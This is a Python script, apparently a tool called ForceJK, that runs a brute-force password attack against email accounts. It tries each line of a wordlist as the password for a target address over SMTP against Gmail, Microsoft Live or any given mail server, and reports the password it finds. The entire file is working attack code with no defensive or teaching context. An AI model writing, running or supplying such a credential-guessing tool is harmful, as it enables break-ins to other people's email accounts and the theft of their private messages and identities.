import smtplib
import argparse
import time
import socket
import os
from setting import logo

class BrutForce:
    def BruteForceGmail(email, file, host):
        print("[*] Connection to server {}...".format(host))
        server = smtplib.SMTP("smtp.gmail.com:587")
        server.ehlo()
        server.starttls()
    #Read file
        print("[*] Start read {}...".format(file))
        file = open(file, "r")
        print("[*] Start brut force attack\n")
        for password in file:
            try:
                server.login(email, password)
                server.quit()
                exit("\n\n[+] Password {}".format(email, password))
            except smtplib.SMTPAuthenticationError as e:
                if "Username and Password not accepted" in str(e):
                    print("[-] Password {}".format(password))
                elif "Please log in via your web browser" in str(e):
                    server.quit()
                    exit("\n\n[+] Password {}".format(password))
                elif "Please log in with your web browser" in str(e):
                    server.quit()
                    exit("Time out...")
            except smtplib.SMTPServerDisconnected:
                exit("SMTP server disconnected...")
        server.quit()
    def BruteForceLive(email, file, host):
        print("[*] Connection to server {}...".format(host))
        server = smtplib.SMTP("smtp.live.com:587")
        server.ehlo()
        server.starttls()
    #Read file
        print("[*] Start read {}...".format(file))
        file = open(file, "r")
        print("[*] Start brut force attack\n")
        for password in file:
            try:
                server.login(email, password)
                server.quit()
                print("\n\n[+] Password {}".format(password))
                exit()
            except smtplib.SMTPAuthenticationError as e:
                if "Authentication unsuccessful" in str(e):
                    print("[-] Password {}".format(password))
                else:
                    print(str(e))
            except smtplib.SMTPServerDisconnected:
                exit("SMTP server disconnected...")
        server.quit()
    def BruteForceSmtp(email, file, host, port):
        print("[*] Connection to server {}...".format(host))
        server = smtplib.SMTP("{}:{}".format(host, port))
        server.ehlo()
        server.starttls()
    #Read file
        print("[*] Start read {}...".format(file))
        file = open(file, "r")
        print("[*] Start brut force attack\n")
        for password in file:
            try:
                server.login(email, password)
                #server.quit()
                exit("\n\n[+] Password {}".format(password))
            except smtplib.SMTPAuthenticationError as e:
                print("[-] Password {}".format(password))
            except smtplib.SMTPServerDisconnected as e:
                exit("SMTP server disconnected...")
            except socket.gaierror:
                print("{} get address info failed")
            except SystemExit:
                pass
        server.quit()
def main():
    parser = argparse.ArgumentParser(prog="forcejk.py", add_help=True,
                                     description=("ForceJK is an brute force program"),
                                     usage=("python forcejk.py -a <account target> -p <password list> -s <server>"))
    parser.add_argument("-H", dest="host", required=True, help="Host target")
    parser.add_argument("-p", dest="port", help="The port used for the server")
    parser.add_argument("-a", dest="account", required=True, help="Email account target")
    parser.add_argument("-w", dest="wordlist", required=True, help="Password list path")
    args = parser.parse_args()
    logo()
    #Check port and server
    if args.port == None:
        if args.host == "gmail":
            pass
        elif args.host == "live":
            pass
        else:
            exit("Host is unknown ,You must use -p <port> for work!")
    else:
        pass
    #Check exits file
    if os.path.exists(args.wordlist) == False:
        exit("No such file or directory!")
    else:
        pass
    if args.host == "gmail":
        BrutForce.BruteForceGmail(args.account, args.wordlist, args.host)
    elif args.host == "live":
        BrutForce.BruteForceLive(args.account, args.wordlist, args.host)
    elif args.host and args.port:
        BrutForce.BruteForceSmtp(args.account, args.wordlist, args.host, args.port)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit("user aborted")
